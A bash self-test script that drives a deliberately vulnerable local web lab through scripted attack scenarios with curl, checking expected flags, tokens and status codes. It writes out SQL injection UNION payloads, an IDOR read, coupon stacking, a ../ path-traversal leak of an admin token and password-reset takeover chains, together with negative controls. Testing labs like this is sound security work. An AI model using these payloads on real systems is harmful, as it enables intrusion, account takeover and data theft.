#!/usr/bin/env bash
# Self-test for repo/lab/campaign_lab.py — every scenario path, negative controls, reset.
set -u
PORT=8901
BASE="http://127.0.0.1:$PORT"
LAB=/home/z/my-project/repo/lab/campaign_lab.py
PASS=0; FAIL=0

check() { # name, expected_substring, actual
  if grep -qF -- "$2" <<< "$3"; then PASS=$((PASS+1)); echo "PASS: $1";
  else FAIL=$((FAIL+1)); echo "FAIL: $1 — wanted '$2' got: ${3:0:200}"; fi
}

cd /tmp && python3 "$LAB" "$PORT" --scenarios S-INJ,S-AUTHZ,S-BIZ,S-CHAIN,S-REPLAN > /tmp/lab.log 2>&1 &
LAB_PID=$!
for i in $(seq 1 20); do curl -sf "$BASE/api/checkout/terms" >/dev/null 2>&1 && break; sleep 0.3; done

# ---- S-INJ ---------------------------------------------------------------
R=$(curl -s "$BASE/api/orders?q=alice")
check "inj negative-control alice-only" '"customer": "alice"' "$R"
check "inj negative-control count" '"id": 2' "$R"
R=$(curl -s "$BASE/api/orders?q=%27%20OR%20%271%27%3D%271")
check "inj boolean-diff all-rows" '"id": 6' "$R"
R=$(curl -s "$BASE/api/orders?q=%27%20UNION%20SELECT%20999%2Cservice%2Ccode%2C0%20FROM%20backup_codes--")
check "inj union backup-code" 'BKC-9f31a2c8d0e4' "$R"

# ---- S-AUTHZ ---------------------------------------------------------------
BOB=$(curl -s -X POST "$BASE/api/session" -d '{"username":"bob","password":"pw-bob"}' | python3 -c "import json,sys;print(json.load(sys.stdin)['token'])")
check "authz bob login" 'tok-' "$BOB"
R=$(curl -s "$BASE/api/notes/n-1001" -H "Authorization: Bearer $BOB")
check "authz IDOR bob reads alice note" 'ALICE-PRIVATE-Q4-RESTRUCTURING-7741' "$R"
R=$(curl -s -w '|%{http_code}' "$BASE/api/notes/n-1001")
check "authz unauthenticated denied" 'authentication required' "$R"
check "authz unauthenticated status 401" '|401' "$R"
R=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/api/notes/n-9999" -H "Authorization: Bearer $BOB")
check "authz unknown note 404" '404' "$R"
R=$(curl -s "$BASE/api/notes/n-1002" -H "Authorization: Bearer $BOB")
check "authz own note readable" 'BOB-SERVERS-MAINT-WINDOW-3387' "$R"

# ---- S-BIZ ---------------------------------------------------------------
R=$(curl -s "$BASE/api/checkout/terms")
check "biz terms document rule" 'one coupon application per customer' "$R"
R=$(curl -s -X POST "$BASE/api/checkout" -d '{"items":[{"sku":"premium-widget","qty":1}],"coupons":["LAUNCH-25"]}')
check "biz legit single coupon = 75.0" '"total": 75.0' "$R"
R=$(curl -s -X POST "$BASE/api/checkout" -d '{"items":[{"sku":"premium-widget","qty":1}],"coupons":["LAUNCH-25","LAUNCH-25"]}')
check "biz stacked coupons = 56.25 (vuln, below 75.00 floor)" '"total": 56.25' "$R"
OID=$(grep -o '"order_id": "[^"]*"' <<< "$R" | grep -o 'ord-[0-9]*')
R=$(curl -s "$BASE/api/checkout/receipt/$OID")
check "biz receipt persists abuse" '"coupons": ["LAUNCH-25", "LAUNCH-25"]' "$R"

# ---- S-CHAIN ---------------------------------------------------------------
R=$(curl -s "$BASE/api/files")
check "chain files listing" 'manual.txt' "$R"
R=$(curl -s "$BASE/api/files?name=manual.txt")
check "chain normal file" 'CampaignLab FileStore manual' "$R"
R=$(curl -s "$BASE/api/files?name=../../../../etc/campaign-lab/admin_token")
check "chain traversal leaks admin token" 'ADM-9f4c-CHAIN-2210' "$R"
R=$(curl -s -X POST "$BASE/api/admin/reset-password" -d '{"token":"ADM-9f4c-CHAIN-2210","new_password":"np-chain-1"}')
check "chain reset with leaked token" '"reset": "admin-password"' "$R"
ADM=$(curl -s -X POST "$BASE/api/session" -d '{"username":"admin","password":"np-chain-1"}' | python3 -c "import json,sys;print(json.load(sys.stdin).get('token',''))")
check "chain admin session with new pw" 'tok-' "$ADM"
R=$(curl -s "$BASE/api/admin/objective-flag" -H "Authorization: Bearer $ADM")
check "chain flag" 'FLAG-CH4IN-7d21-VERIFIED-ACCESS' "$R"
R=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/api/admin/objective-flag")
check "chain flag denied unauthenticated" '403' "$R"

# ---- S-REPLAN ---------------------------------------------------------------
R=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/api/admin/login" -d '{"password":"admin123"}')
check "replan brute attempt 1 fails" '401' "$R"
R=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/api/admin/login" -d '{"password":"P@ssw0rd!"}')
check "replan brute attempt 2 fails" '401' "$R"
R=$(curl -s "$BASE/sitemap.xml")
check "replan sitemap lists reset flow" '/api/password/reset-question' "$R"
R=$(curl -s "$BASE/api/profiles/admin/support")
check "replan support ticket reveals pet answer" 'Rex' "$R"
R=$(curl -s "$BASE/api/password/reset-question?username=admin")
check "replan reset question+nonce" 'RST-55123' "$R"
R=$(curl -s -X POST "$BASE/api/password/reset" -d '{"username":"admin","answer":"Rex","nonce":"RST-55123","new_password":"np-replan-1"}')
check "replan reset succeeds with answer" '"reset": "admin-password"' "$R"
ADM=$(curl -s -X POST "$BASE/api/session" -d '{"username":"admin","password":"np-replan-1"}' | python3 -c "import json,sys;print(json.load(sys.stdin).get('token',''))")
R=$(curl -s "$BASE/api/admin/objective-flag" -H "Authorization: Bearer $ADM")
if grep -qE 'FLAG-REPL4N-3c08-EVIDENCE-DRIVEN|FLAG-CH4IN-7d21-VERIFIED-ACCESS' <<< "$R"; then PASS=$((PASS+1)); echo "PASS: replan flag (either flag acceptable when both scenarios enabled)";
else FAIL=$((FAIL+1)); echo "FAIL: replan flag — got: ${R:0:200}"; fi

# ---- reset + wrong answer control ------------------------------------------
R=$(curl -s -X POST "$BASE/__reset" -H "X-Lab-Control: $(python3 -c "
import hashlib;print('ctl-local-'+hashlib.sha256(b'8901:S-INJ,S-AUTHZ,S-BIZ,S-CHAIN,S-REPLAN').hexdigest()[:12])")")
check "reset via control endpoint" '"reset": true' "$R"
R=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/api/password/reset" -d '{"username":"admin","answer":"Charlie","nonce":"RST-55123","new_password":"x"}')
check "replan wrong answer denied" '403' "$R"
R=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/api/admin/reset-password" -d '{"token":"WRONG","new_password":"x"}')
check "chain wrong token denied" '403' "$R"
R=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/api/profiles/admin")
check "scenario gating (profiles off after reset? same scenarios) n/a" '200' "$R"

kill $LAB_PID 2>/dev/null
echo "-----------------------------"
echo "PASS=$PASS FAIL=$FAIL"
exit $FAIL
